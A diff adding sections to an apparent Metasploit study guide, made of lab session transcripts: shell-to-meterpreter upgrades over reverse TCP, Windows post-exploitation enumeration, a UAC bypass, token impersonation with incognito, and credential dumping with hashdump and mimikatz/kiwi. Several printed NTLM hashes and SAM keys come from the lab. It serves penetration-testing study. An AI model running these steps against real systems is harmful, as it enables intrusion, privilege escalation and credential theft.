@@ -47,6 +47,16 @@
     - Meterpreter Fundamentals 
     - Upgrading Command Shells To Meterpreter Shells    
   - Windows Post Exploitation
+    - Windows Post Exploitation Modules    
+    - Windows Privilege Escalation: Bypassing UAC    
+    - Windows Privilege Escalation:Token Impersonation With Incognito    
+    - Dumping Hashes With Mimikatz    
+    - Pass-the-Hash With PSExec    
+    - Establishing Persistence On Windows    
+    - Enabling RDP    
+    - Windows Keylogging    
+    - Clearing Windows Event Logs    
+    - Pivoting    
   - Linux Post Exploitation
 
 - ##### Armitage
@@ -2324,4 +2334,1844 @@ meterpreter > ps
 
 
 
-#### Upgrading Command Shells To Meterpreter Shells    
+#### Upgrading Command Shells To Meterpreter Shells 
+
+**1- using `post/multi/manage/shell_to_meterpreter`**
+
+```   bash
+msf5 exploit(linux/samba/is_known_pipename) > use post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) > options 
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
+SESSION => 1
+msf5 post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.138.57.2:4433 
+[*] Sending stage (985320 bytes) to 192.138.57.3
+[*] Meterpreter session 2 opened (192.138.57.2:4433 -> 192.138.57.3:53190) at 2024-02-03 14:46:03 +0000
+pwd
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                  Connection
+  --  ----  ----                   -----------                                  ----------
+  1         shell cmd/unix                                                      192.138.57.2:38613 -> 192.138.57.3:445 (192.138.57.3)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.138.57.3  192.138.57.2:4433 -> 192.138.57.3:53190 (192.138.57.3)
+```
+
+
+
+
+
+**2- using `session -u`**
+
+```bash
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                  Connection
+  --  ----  ----                   -----------                                  ----------
+  1         shell cmd/unix                                                      192.138.57.2:38613 -> 192.138.57.3:445 (192.138.57.3)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.138.57.3  192.138.57.2:4433 -> 192.138.57.3:53190 (192.138.57.3)
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.138.57.2:4433 
+[*] Sending stage (985320 bytes) to 192.138.57.3
+[*] Meterpreter session 3 opened (192.138.57.2:4433 -> 192.138.57.3:46372) at 2024-02-03 14:48:35 +0000
+[*] Command stager progress: 100.00% (773/773 bytes)
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                  Connection
+  --  ----  ----                   -----------                                  ----------
+  1         shell cmd/unix                                                      192.138.57.2:38613 -> 192.138.57.3:445 (192.138.57.3)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.138.57.3  192.138.57.2:4433 -> 192.138.57.3:53190 (192.138.57.3)
+  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.138.57.3  192.138.57.2:4433 -> 192.138.57.3:46372 (192.138.57.3)
+```
+
+
+
+---
+
+#### Windows Post Exploitation
+
++ The MSF provides us with various post exploitation modules for both Windows and Linux.
++ We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:
+  + Enumerate user privileges
+  + Enumerate logged on users
+  + VM check
+  + Enumerate installed programs
+  + Enumerate AVs
+  + Enumerate computers connected to domain
+  + Enumerate installed patches
+  + Enumerate shares
+
+
+
+**elevate the privilege with `getsystem`**
+
+```bash
+meterpreter > pwd
+C:\hfs
+meterpreter > getuid
+Server username: WIN-OMCNBKR66MN\Administrator
+
+meterpreter > sysinfo
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+meterpreter > getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+
+
+
+
+**view mounted drivers**
+
+```bash
+meterpreter > show_mount 
+
+Mounts / Drives
+===============
+
+Name  Type   Size (Total)  Size (Free)  Mapped to
+----  ----   ------------  -----------  ---------
+C:\   fixed   29.66 GiB      8.47 GiB   
+
+
+Total mounts/drives: 1
+
+```
+
+fixed: hard disk
+
+removable: usb
+
+
+
+
+
+```bash
+meterpreter > getuid
+Server username: WIN-OMCNBKR66MN\Administrator
+meterpreter > ps | grep explorer
+Filtering on 'explorer'
+
+Process List
+============
+
+ PID   PPID  Name          Arch  Session  User                           Path
+ ---   ----  ----          ----  -------  ----                           ----
+ 2316  2308  explorer.exe  x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe
+
+meterpreter > sysinfo 
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+meterpreter > migrate 2316
+[*] Migrating from 388 to 2316...
+[*] Migration completed successfully.
+
+meterpreter > sysinfo 
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+
+meterpreter > getuid 
+Server username: WIN-OMCNBKR66MN\Administrator
+
+```
+
+
+
+**migrate to specific process `post/windows/manage/migrate`**
+
+```
+msf5 exploit(windows/http/rejetto_hfs_exec) > use post/windows/manage/migrate
+msf5 post(windows/manage/migrate) > options 
+
+Module options (post/windows/manage/migrate):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   KILL       false            no        Kill original process for the session.
+   NAME                        no        Name of process to migrate to.
+   PID        0                no        PID of process to migrate to.
+   PPID       0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).
+   PPID_NAME                   no        Name of process for PPID spoofing when creating a new process.
+   SESSION                     yes       The session to run this module on.
+   SPAWN      true             no        Spawn process to migrate to. If set, notepad.exe is used.
+
+msf5 post(windows/manage/migrate) > set SESSION 1
+SESSION => 1
+msf5 post(windows/manage/migrate) > run
+
+```
+
+
+
+**enumerate the privilege of current user `post/windows/gather/win_privs` **
+
+```bash
+msf5 post(windows/manage/migrate) > use post/windows/gather/win_privs 
+msf5 post(windows/gather/win_privs) > options 
+
+Module options (post/windows/gather/win_privs):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(windows/gather/win_privs) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/win_privs) > run
+
+Current User
+============
+
+ Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
+ --------  ---------  -----------------------  -----------  -------------  ---
+ True      False      True                     True         1              WIN-OMCNBKR66MN\Administrator
+
+Windows Privileges
+==================
+
+ Name
+ ----
+ SeBackupPrivilege
+ SeChangeNotifyPrivilege
+ SeCreateGlobalPrivilege
+ SeCreatePagefilePrivilege
+ SeCreateSymbolicLinkPrivilege
+ SeDebugPrivilege
+ SeImpersonatePrivilege
+ SeIncreaseBasePriorityPrivilege
+ SeIncreaseQuotaPrivilege
+ SeIncreaseWorkingSetPrivilege
+ SeLoadDriverPrivilege
+ SeManageVolumePrivilege
+ SeProfileSingleProcessPrivilege
+ SeRemoteShutdownPrivilege
+ SeRestorePrivilege
+ SeSecurityPrivilege
+ SeShutdownPrivilege
+ SeSystemEnvironmentPrivilege
+ SeSystemProfilePrivilege
+ SeSystemtimePrivilege
+ SeTakeOwnershipPrivilege
+ SeTimeZonePrivilege
+ SeUndockPrivilege
+
+[*] Post module execution completed
+
+```
+
+
+
+
+
+**enumerate all users that are logged on  `post/windows/gather/enum_logged_on_users` **
+
+```bash
+msf5 post(windows/gather/win_privs) > use post/windows/gather/enum_logged_on_users
+msf5 post(windows/gather/enum_logged_on_users) > options 
+
+Module options (post/windows/gather/enum_logged_on_users):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CURRENT  true             yes       Enumerate currently logged on users
+   RECENT   true             yes       Enumerate Recently logged on users
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(windows/gather/enum_logged_on_users) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/enum_logged_on_users) > run
+
+[*] Running against session 1
+
+Current Logged Users
+====================
+
+ SID                                            User
+ ---                                            ----
+ S-1-5-21-2563855374-3215282501-1490390052-500  WIN-OMCNBKR66MN\Administrator
+
+
+[+] Results saved in: /root/.msf4/loot/20240203215502_default_10.4.29.99_host.users.activ_721433.txt
+
+Recently Logged Users
+=====================
+
+ SID                                            Profile Path
+ ---                                            ------------
+ S-1-5-18                                       %systemroot%\system32\config\systemprofile
+ S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
+ S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
+ S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator
+
+
+[*] Post module execution completed
+```
+
+
+
+
+
+**check if the target is virtual machine `post/windows/gather/checkvm`**
+
+```bash
+msf5 post(windows/gather/enum_logged_on_users) > use post/windows/gather/checkvm
+msf5 post(windows/gather/checkvm) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/checkvm) > run
+
+[*] Checking if WIN-OMCNBKR66MN is a Virtual Machine .....
+[+] This is a Xen Virtual Machine
+[*] Post module execution completed
+
+```
+
+
+
+
+
+**enumerate the installed applications on the target `post/windows/gather/enum_applications` **
+
+```bash
+msf5 post(windows/gather/checkvm) > use post/windows/gather/enum_applications
+msf5 post(windows/gather/enum_applications) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/enum_applications) > run
+
+[*] Enumerating applications installed on WIN-OMCNBKR66MN
+
+Installed Applications
+======================
+
+ Name                                Version
+ ----                                -------
+ AWS PV Drivers                      8.3.3
+ AWS Tools for Windows               3.15.1084
+ Amazon SSM Agent                    2.3.842.0
+ Amazon SSM Agent                    2.3.842.0
+ EC2ConfigService                    4.9.4222.0
+ EC2ConfigService                    4.9.4222.0
+ EC2ConfigService                    4.9.4222.0
+ Mozilla Firefox 80.0.1 (x86 en-US)  80.0.1
+ Mozilla Maintenance Service         80.0.1
+ aws-cfn-bootstrap                   1.4.33
+
+
+[+] Results stored in: /root/.msf4/loot/20240203220003_default_10.4.29.99_host.application_646378.txt
+[*] Post module execution completed
+
+```
+
+if there is a privilege escalation vulnerability in this firefox version, we can exploit it
+
+
+
+**enumerate windows antivirus exclutions `post/windows/gather/enum_av_excluded` **
+
+```bash
+msf5 post(windows/gather/enum_applications) > use post/windows/gather/enum_av_excluded
+msf5 post(windows/gather/enum_av_excluded) > options 
+
+Module options (post/windows/gather/enum_av_excluded):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   DEFENDER    true             yes       Enumerate exclusions for Microsoft Defender
+   ESSENTIALS  true             yes       Enumerate exclusions for Microsoft Security Essentials/Antimalware
+   SEP         true             yes       Enumerate exclusions for Symantec Endpoint Protection (SEP)
+   SESSION                      yes       The session to run this module on.
+
+msf5 post(windows/gather/enum_av_excluded) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/enum_av_excluded) > run
+
+[*] Enumerating Excluded Paths for AV on WIN-OMCNBKR66MN
+[+] Found Windows Defender
+[*] No extension exclusions for Windows Defender
+[*] No path exclusions for Windows Defender
+[*] No process exclusions for Windows Defender
+[*] Post module execution completed
+
+```
+
+No excluded folders have been set. the entire file system is being scanned and monitored by the antivirus solutions
+
+
+
+**enumerate computers that are part of domain `post/windows/gather/enum_computers` **
+
+```bash
+msf5 post(windows/gather/enum_av_excluded) > use post/windows/gather/enum_computers
+msf5 post(windows/gather/enum_computers) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/enum_computers) > run
+
+[*] Running module against WIN-OMCNBKR66MN
+[-] This host is not part of a domain.
+[*] Post module execution completed
+
+```
+
+
+
+
+
+**enumerate installed patches `post/windows/gather/enum_patches` **
+
+```
+msf5 post(windows/gather/enum_computers) > use post/windows/gather/enum_patches
+msf5 post(windows/gather/enum_patches) > options 
+
+Module options (post/windows/gather/enum_patches):
+
+   Name       Current Setting       Required  Description
+   ----       ---------------       --------  -----------
+   KB         KB2871997, KB2928120  yes       A comma separated list of KB patches to search for
+   MSFLOCALS  true                  yes       Search for missing patches for which there is a MSF local module
+   SESSION                          yes       The session to run this module on.
+
+msf5 post(windows/gather/enum_patches) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/enum_patches) > run
+
+[-] Known bug in WMI query, try migrating to another process
+[*] Post module execution completed
+
+
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                           Path
+ ---   ----  ----                  ----  -------  ----                           ----
+736   496   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\svchost.exe
+
+meterpreter > migrate 736
+[*] Migrating from 2316 to 736...
+[*] Migration completed successfully.
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+
+```
+
+
+
+**or using `systeminfo`**
+
+```bash
+meterpreter > shell
+Process 1580 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>systeminfo
+systeminfo
+
+Host Name:                 WIN-OMCNBKR66MN
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          EC2
+Registered Organization:   Amazon.com
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 208 Hotfix(s) Installed.
+                           [01]: KB2894856
+                           [02]: KB2896496
+                           [03]: KB2919355
+                           [04]: KB2919442
+                           [05]: KB2934520
+                           [06]: KB2938066
+                           [37]: KB3013172
+
+```
+
+
+
+
+
+**enumerate all shares `post/windows/gather/enum_shares` **
+
+```bash
+msf5 post(windows/gather/enum_patches) > use post/windows/gather/enum_shares
+msf5 post(windows/gather/enum_shares) > set SESSION 1
+SESSION => 1
+msf5 post(windows/gather/enum_shares) > run
+
+[*] Running against session 1
+[*] The following shares were found:
+[*] 	Name: print$
+[*] 
+[*] Post module execution completed
+
+```
+
+
+
+**check if the RDP is enabled  `post/windows/manage/enable_rdp` **
+
+```bash
+msf5 post(windows/gather/enum_shares) > use post/windows/manage/enable_rdp
+msf5 post(windows/manage/enable_rdp) > set SESSION 1
+SESSION => 1
+msf5 post(windows/manage/enable_rdp) > run
+
+[*] Enabling Remote Desktop
+[*] 	RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] 	The Terminal Services service is not set to auto, changing it to auto ...
+[*] The following Error was encountered: RuntimeError Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
+[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20240203222114_default_10.4.29.99_host.windows.cle_847803.txt
+[*] Post module execution completed
+
+```
+
+
+
+---
+
+#### Windows Privilege Escalation: Bypassing UAC    
+
++ User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
++ UAC is used to ensure that changes to the operating system require approval from the administrator.
++ We can utilize the “Windows Escalate UAC Protection Bypass (In Memory Injection)” module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.
+
+``` bash
+meterpreter > getuid
+Server username: VICTIM\admin
+meterpreter > getsystem 
+[-] 2001: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+
+===================== we do not have permission to elevate privileges============================
+ 
+ 
+meterpreter > getprivs 
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > shell
+Process 1956 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users
+net users
+
+User accounts for \\VICTIM
+
+-------------------------------------------------------------------------------
+admin                    Administrator            Guest                    
+The command completed successfully.
+
+
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
+net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+admin
+Administrator
+The command completed successfully.
+
+
+```
+
+`admin` user in the administrators group, so we can bypass UAC easily
+
+
+
+**bypass UAC `exploit/windows/local/bypassuac_injection`**
+
+This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.
+
+```bash
+msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/bypassuac_injection
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_injection) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_injection) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information            Connection
+  --  ----  ----                     -----------            ----------
+  1         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.80.2:4444 -> 10.4.31.124:49246 (10.4.31.124)
+
+msf6 exploit(windows/local/bypassuac_injection) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/bypassuac_injection) > options 
+
+Module options (exploit/windows/local/bypassuac_injection):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.80.2       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/bypassuac_injection) > run
+
+[*] Started reverse TCP handler on 10.10.80.2:4444 
+[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[-] Exploit aborted due to failure: bad-config: x86 Target Selected for x64 System
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/local/bypassuac_injection) > set TARGET Windows\ x64 
+TARGET => Windows x64
+msf6 exploit(windows/local/bypassuac_injection) > run
+
+[*] Started reverse TCP handler on 10.10.80.2:4444 
+[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Uploading the Payload DLL to the filesystem...
+[*] Spawning process with Windows Publisher Certificate, to inject into...
+[+] Successfully injected payload in to process: 2520
+[*] Sending stage (200262 bytes) to 10.4.31.124
+[*] Meterpreter session 2 opened (10.10.80.2:4444 -> 10.4.31.124:49282) at 2024-02-03 22:43:21 +0530
+
+meterpreter > sysinfo
+Computer        : VICTIM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: VICTIM\admin
+meterpreter > getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
+we were able to be `NT AUTHORITY\SYSTEM` because we disabled UAC
+
+
+
+---
+
+#### Windows Privilege Escalation:Token Impersonation With Incognito    
+
+#### Windows Access Tokens
+
++ Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
++ A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
++ Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
++ Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
++ An access token will typically be assigned one of the following security levels:
+  + Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
+  + Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.
++ Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
++ Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
+
+
+
+**Windows Privileges**
+
++ The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
++ The following are the privileges that are required for a successful impersonation attack:
++ SeAssignPrimaryToken: This allows a user to impersonate tokens.
++ SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
++ SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
+
+
+
+**The Incognito Module**
+
++ Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
++ We can use the incognito module to display a list of available tokens that we can impersonate.
+
+
+
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\LOCAL SERVICE
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege			<<<<<<<<<<==============
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeSystemtimePrivilege
+SeTimeZonePrivilege
+
+meterpreter > 
+
+```
+
+`LOCAL SERVICE` is an unprivileged account by default.
+
+after running `getprivs` we found that  `SeImpersonatePrivilege` is exist, so we can impersonate access tokens available using `Incognito module`
+
+
+
+**Load incognito plugin and check all available tokens.**
+
+```bash
+meterpreter > load incognito 
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+ATTACKDEFENSE\Administrator
+NT AUTHORITY\LOCAL SERVICE
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+
+```
+
+we have the administrator account access token which will provide us with elevated privileges  
+
+
+
+ **impersonate administrator account access token**
+
+```bash
+meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user ATTACKDEFENSE\Administrator
+
+meterpreter > getuid
+Server username: ATTACKDEFENSE\Administrator
+
+meterpreter > getprivs 
+[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
+meterpreter > pgrep explorer
+3460
+
+meterpreter > migrate 3460
+[*] Migrating from 3756 to 3460...
+[*] Migration completed successfully.
+
+meterpreter > sysinfo
+Computer        : ATTACKDEFENSE
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+
+```
+
+
+
+---
+
+#### Pass-the-Hash With PSExec    
+
++ Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM databases, and more.
++ The SAM (Security Account Manager) database, is a database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely.
++ We can utilize the pre-built mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
++ Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk.
+
+**migrate with lsass process**
+
+```bash
+meterpreter > sysinfo 
+Computer        : ATTACKDEFENSE
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > hashdump 
+[-] 2007: Operation failed: The parameter is incorrect.
+
+meterpreter > pgrep lsass
+788
+
+meterpreter > migrate 788
+[*] Migrating from 368 to 788...
+[*] Migration completed successfully.
+
+meterpreter > sysinfo 
+Computer        : ATTACKDEFENSE
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+
+```
+
+
+
+**Dumping Hashes With kiwi**
+
+load kiwi to meterpreter shell after migrating with lsass process and get high privileges
+
+```bash
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+
+meterpreter > creds_all 
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username       Domain         NTLM                              SHA1
+--------       ------         ----                              ----
+Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef
+
+wdigest credentials
+===================
+
+Username        Domain         Password
+--------        ------         --------
+(null)          (null)         (null)
+ATTACKDEFENSE$  WORKGROUP      (null)
+Administrator   ATTACKDEFENSE  (null)
+
+kerberos credentials
+====================
+
+Username        Domain         Password
+--------        ------         --------
+(null)          (null)         (null)
+Administrator   ATTACKDEFENSE  (null)
+attackdefense$  WORKGROUP      (null)
+
+==============================================================================================================================
+==============================================================================================================================
+
+meterpreter > lsa_dump_sam 
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : ATTACKDEFENSE
+SysKey : 377af0de68bdc918d22c57a263d38326
+Local SID : S-1-5-21-3688751335-3073641799-161370460
+
+SAMKey : 858f5bda5c99e45094a6a1387241a33d
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
